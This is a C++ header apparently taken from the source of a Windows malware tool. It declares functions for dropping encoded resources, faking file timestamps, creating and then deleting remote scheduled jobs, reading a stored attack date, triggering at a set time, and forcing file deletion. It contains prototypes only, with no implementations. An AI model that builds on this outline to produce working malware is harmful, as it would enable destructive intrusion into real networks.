/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/
// Utils.h
// Misc. utility functions used globally

#include <string>

#define ADA_MINUTE 5
#define ADA_HOUR   4
#define ADA_DAY    3
#define ADA_MONTH  1
#define ADA_YEAR   0


bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType, char *key, unsigned int key_len);
bool SetSafeFileTime(LPCWSTR lpFileName);
bool StartServiceProcess(WCHAR *svc_name, const WCHAR *svc_path, DWORD *service_id);

bool AddNewJob(const WCHAR *UncServerName, WCHAR *svc_path);
int DeleteJobAfter95Seconds(JOB_PROPERTIES *lpAddress);

void DeleteRandExecutables();
bool GetRandomServiceInfo(WCHAR *svc_name, WCHAR *svc_path);
DWORD GetRandom();

bool GetAttackDateFromFile(WORD *a1);
int TimeToAttack();
bool IsLeapYear(signed int year);
int GetDaysInMonth(signed int year, unsigned int month);

int _Wow64DisableWow64FsRedirection(PVOID *OldValue);
int _Wow64RevertWow64FsRedirection(PVOID OldValue);

bool Is64Bit();

DWORD SearchProcessByIdOrName(DWORD dwPID, WCHAR *szProcessName);
DWORD GetProcessID(WCHAR *process_name);

WCHAR *strcpyW(WCHAR *a1, const WCHAR *a2, ...);
char *strset(char *dst, char chr, int size);
UINT32 strlenW(const WCHAR *string);
bool strcmpW(WCHAR *a1, WCHAR *a2);
char *btowc(char *a1, WCHAR *a2, int a3);

bool ForceFileDeletion(LPCWSTR file_to_delete);